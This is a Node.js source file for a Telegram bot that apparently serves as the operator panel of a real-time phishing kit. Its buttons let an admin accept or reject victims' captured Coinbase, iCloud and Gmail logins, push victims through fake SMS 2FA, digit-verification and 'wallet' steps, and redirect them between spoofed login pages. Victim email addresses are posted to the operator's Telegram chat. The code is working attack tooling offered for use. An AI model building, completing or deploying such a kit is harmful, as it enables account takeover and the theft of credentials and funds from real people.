const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing env vars");
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, {
  polling: { autoStart: true, params: { timeout: 10 } }
});

bot.getMe().then(() => {
  console.log(`✅ Bot connected`);
}).catch(err => {
  console.error("❌ Bot failed:", err.message);
});

const handledCallbacks = new Set();

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) return;
  handledCallbacks.add(callbackId);

  try {
    const [action, email] = query.data.split("|");

    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verifying_sms" ? "VERIFYING SMS" : action === "verifying_done" ? "VERIFYING DONE" : action === "verifying_wallet" ? "VERIFYING WALLET" : action === "sms2_wallet" ? "SMS2 WALLET" : action === "sms2_done" ? "SMS2 DONE" : action === "sms2_reject" ? "SMS2 REJECT" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);

    // ✅ HANDLE VERIFY_DIGIT CALLBACKS (Gmail verification page)
    if (action === "verify_digit") {
      const [, requestId, digit] = query.data.split("|");
      console.log(`📍 Digit ${digit} clicked for requestId: ${requestId}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId, digit })
        });
        
        const result = await updateResult.json();
        console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
        
        // If 2 digits are selected, remove the buttons
        if (result.selectedCount === 2) {
          try {
            await bot.editMessageReplyMarkup(
              { inline_keyboard: [] },
              { chat_id: query.message.chat.id, message_id: query.message.message_id }
            );
            
            // Send a follow-up message
            await bot.sendMessage(
              query.message.chat.id,
              `✅ <b>Numbers Selected!</b>`,
              { parse_mode: "HTML" }
            );
          } catch (err) {
            console.error("❌ Error editing message:", err);
          }
        }

        await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
        return;
      } catch (err) {
        console.error("❌ verify_digit error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
        return;
      }
    }

    // ✅ HANDLE SMS 2 BUTTONS (Wallet / Done / Reject)
    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject") {
      const sms2Id = email; // email param is actually sms2Id
      console.log(`📲 SMS 2 choice: ${action} for sms2Id: ${sms2Id}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sms2Id, choice: action })
        });
        
        const result = await updateResult.json();
        console.log(`✅ SMS 2 choice updated: ${action}`);
        
        // Remove buttons from Telegram message
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        // Send popup
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        return;
      } catch (err) {
        console.error("❌ SMS 2 choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ✅ HANDLE VERIFYING BUTTONS (SMS / Done / Wallet)
    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet") {
      const verifyingId = email; // email param is actually verifyingId
      console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
      
      try {
        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ verifyingId, choice: action })
        });
        
        const result = await updateResult.json();
        console.log(`✅ Verifying choice updated: ${action}`);
        
        // Remove buttons from Telegram message
        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (err) {
          console.error("Error removing buttons:", err);
        }
        
        // Send popup
        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
        
        // Get verifying info from backend and send status message
        try {
          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
          const verifyData = await verifyRes.json();
          const verifyEmail = verifyData.email || 'unknown@example.com';
          
          let choiceText = '';
          if (action === 'verifying_sms') {
            choiceText = 'SMS - 2 💬';
          } else if (action === 'verifying_done') {
            choiceText = 'Done 🏁';
          } else if (action === 'verifying_wallet') {
            choiceText = 'Wallet 💼';
          }
          
          const statusMsg = `📧 <code>${verifyEmail}</code> → <b>${choiceText}</b>`;
          
          const botToken = process.env.BOT_TOKEN;
          const chatId = process.env.ADMIN_CHAT_ID;
          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
          await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: statusMsg,
              parse_mode: "HTML"
            })
          });
          console.log(`✅ Sent status message: ${statusMsg}`);
        } catch (err) {
          console.error("Error sending status message:", err);
        }
        
        return;
      } catch (err) {
        console.error("❌ verifying choice error:", err);
        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
        return;
      }
    }

    // ✅ Map iCloud accept/reject to correct status
    let statusForBackend = action;
    if (action === "page_accept") {
      statusForBackend = "accepted";
    } else if (action === "page_reject") {
      statusForBackend = "rejected";
    } else if (action === "sms_accept") {
      statusForBackend = "accepted";
    } else if (action === "sms_reject") {
      statusForBackend = "rejected";
    } else if (action === "gmail_accept") {
      statusForBackend = "accepted";
    } else if (action === "gmail_reject") {
      statusForBackend = "rejected";
    } else if (action === "gmail_verify_accept") {
      statusForBackend = "accepted";
    } else if (action === "gmail_verify_reject") {
      statusForBackend = "rejected";
    } else if (action === "sms2_wallet") {
      statusForBackend = "wallet";
    } else if (action === "sms2_done") {
      statusForBackend = "done";
    } else if (action === "sms2_reject") {
      statusForBackend = "rejected";
    }

    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email,
        status: statusForBackend
      })
    });

    // Also handle iCloud page status updates
    if (action.includes("page_")) {
      await fetch(`${APP_URL}/update-page-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, status: action })
      });
    }

    // Also handle SMS status updates
    if (action.includes("sms_")) {
      await fetch(`${APP_URL}/update-sms-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, status: action })
      });
    }

    // Handle redirection choices
    if (action.includes("redirect_")) {
      await fetch(`${APP_URL}/update-redirection-choice`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, choice: action })
      });
    }

    if (response.ok) {
      // Remove buttons from original message by editing reply_markup
      try {
        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
        await fetch(editUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: query.message?.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [] })  // ✅ Empty buttons!
          })
        });
      } catch (err) {}

      // Send status reply
      let statusMessage = "";
      console.log(`📋 Building status message for action: ${action}, email: ${email}`);
      
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> Coinbase Login <b>REJECTED</b>! ❌`;
      } else if (action === "page_accept") {
        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
        console.log(`✅ PAGE_ACCEPT matched! Message: ${statusMessage}`);
      } else if (action === "page_reject") {
        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
        console.log(`❌ PAGE_REJECT matched! Message: ${statusMessage}`);
      } else if (action === "sms_accept") {
        statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
      } else if (action === "sms_reject") {
        statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
      } else if (action === "redirect_icloud") {
        statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
      } else if (action === "redirect_gmail") {
        statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
      } else if (action === "gmail_accept") {
        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>ACCEPTED</b>! ✅`;
        console.log(`✅ GMAIL_ACCEPT matched! Message: ${statusMessage}`);
      } else if (action === "gmail_reject") {
        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>REJECTED</b>! ❌`;
        console.log(`❌ GMAIL_REJECT matched! Message: ${statusMessage}`);
      } else if (action === "gmail_verify_accept") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
        console.log(`✅ GMAIL_VERIFY_ACCEPT matched! Message: ${statusMessage}`);
      } else if (action === "gmail_verify_reject") {
        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
        console.log(`❌ GMAIL_VERIFY_REJECT matched! Message: ${statusMessage}`);
      } else if (action === "verifying_sms") {
        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
      } else if (action === "verifying_done") {
        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
      } else if (action === "verifying_wallet") {
        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
      } else if (action === "sms2_wallet") {
        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Wallet</b> 💼`;
      } else if (action === "sms2_done") {
        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Done</b> 🏁`;
      } else if (action === "sms2_reject") {
        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Rejected</b> ❌`;
      }

      console.log(`📨 Final statusMessage: "${statusMessage}"`);

      // ✅ SEND THE MESSAGE
      if (statusMessage) {
        try {
          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          console.log(`🚀 Sending message to Telegram...`);
          await fetch(replyUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: statusMessage,
              parse_mode: "HTML"
            })
          });
          console.log(`✅ Message sent successfully!`);
        } catch (err) {
          console.error(`❌ Failed to send status message:`, err);
        }
      } else {
        console.log(`⚠️ statusMessage is empty, not sending`);
      }
    }

    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

console.log(`✅ Bot ready`);

module.exports = { bot };

// ============================================================================
// ICLOUD CALLBACK HANDLERS
// ============================================================================

// Note: Add this inside the bot.on("callback_query") handler
// When processing callbacks, add these patterns:
// - page_accept|${email} → set pendingPage[email].status = "accepted"
// - page_reject|${email} → set pendingPage[email].status = "rejected"
// - sms_accept|${code} → set pendingCodes[code].status = "accepted"
// - sms_reject|${code} → set pendingCodes[code].status = "rejected"

// The callback handler should already be processing these patterns
// Just ensure it hits the right endpoints for iCloud
